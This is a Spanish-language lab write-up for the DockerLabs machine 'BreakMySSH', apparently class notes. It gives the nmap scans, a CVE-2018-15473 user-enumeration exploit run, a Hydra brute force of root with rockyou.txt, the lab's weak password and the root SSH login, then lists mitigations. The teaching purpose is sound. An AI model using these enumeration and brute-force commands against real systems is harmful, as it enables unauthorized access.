# BreakMySSH

**Plataforma:** DockerLabs\
**Dificultad:** Muy fácil\
**Área:** Reconocimiento, SSH y credenciales débiles\
**Material seguido en clase:** [Writeup de referencia](https://github.com/PabloSanchezIglesias/DockerLabs/blob/main/Muy%20facil/BreakMySSH.md)

> La IP del contenedor puede cambiar según el entorno. En el writeup de referencia se utiliza `172.17.0.2`.

## Objetivo

Identificar la superficie expuesta, enumerar el servicio SSH, investigar posibles debilidades, validar un usuario y demostrar el impacto de una contraseña débil dentro del laboratorio.

## Procedimiento

### 1. Reconocimiento completo de puertos

Comenzamos buscando todos los puertos TCP abiertos:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG escaneo
```

Qué buscamos:

* puertos abiertos;
* cantidad de servicios expuestos;
* TTL orientativo del sistema operativo;
* una primera idea de la superficie de ataque.

En esta máquina aparece únicamente el **puerto 22/TCP**, correspondiente a SSH. Esto nos indica que el análisis debe centrarse en ese servicio.

### 2. Enumeración del servicio SSH

Con el puerto identificado, realizamos un escaneo más específico:

```bash
sudo nmap -sCV -p22 172.17.0.2 -oN allPorts
```

`-sC` ejecuta scripts por defecto de Nmap y `-sV` intenta identificar la versión del servicio.

El laboratorio expone:

```
22/tcp  open  ssh  OpenSSH 7.7
```

### 3. Investigar la versión detectada

Con la versión obtenida, buscamos referencias públicas:

```bash
searchsploit OpenSSH 7.7
```

En el writeup utilizado en clase se investiga la enumeración de usuarios asociada a **CVE-2018-15473**.

La lección importante aquí es que encontrar una versión no significa lanzar automáticamente un exploit: primero debemos entender qué vulnerabilidad existe, qué condición necesita y qué información puede entregarnos.

### 4. Preparar el script de enumeración

El writeup toma como referencia el exploit público asociado al EDB-ID `45233` y lo ejecuta localmente para validar usuarios del servidor SSH.

Ejemplo utilizado:

```bash
python3 exploit.py -p 22 172.17.0.2 root
```

El resultado confirma que `root` es un usuario válido en el laboratorio.

### 5. Probar la resistencia de la contraseña

Una vez conocido un usuario válido, se demuestra el riesgo de una contraseña débil mediante Hydra y el diccionario `rockyou.txt`:

```bash
hydra -l root -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh -t 15
```

En esta máquina de práctica, Hydra encuentra la credencial deliberadamente débil:

```
Usuario: root
Contraseña: estrella
```

Esto es parte del diseño vulnerable del laboratorio y no una credencial real.

### 6. Acceder mediante SSH

Validamos la credencial obtenida:

```bash
ssh root@172.17.0.2
```

Cuando el sistema solicita la contraseña usamos la obtenida en el paso anterior.

### 7. Verificar el acceso

Ya dentro del contenedor comprobamos identidad, privilegios y hostname:

```bash
whoami
id
hostname
```

El resultado confirma acceso como `root`.

## Qué aprendimos

El recorrido completo queda así:

```
Escaneo de puertos
        ↓
Enumeración de SSH
        ↓
Identificación de versión
        ↓
Investigación de vulnerabilidades
        ↓
Enumeración de usuario
        ↓
Ataque de credenciales en laboratorio
        ↓
Acceso SSH
        ↓
Verificación de privilegios
```

Más allá de conseguir una shell, esta máquina sirve para entender por qué combinar un servicio expuesto, un usuario privilegiado y una contraseña débil puede terminar en compromiso total.

## Mitigación

* Deshabilitar login SSH directo como `root` cuando no sea necesario.
* Preferir autenticación mediante claves.
* Deshabilitar contraseñas débiles y aplicar políticas robustas.
* Implementar controles frente a intentos repetidos, como Fail2ban o rate limiting.
* Mantener OpenSSH actualizado.
* Restringir SSH por firewall, VPN o allowlists cuando sea posible.

> Todo este procedimiento corresponde a un laboratorio deliberadamente vulnerable. Debe reproducirse únicamente en entornos propios o expresamente autorizados.
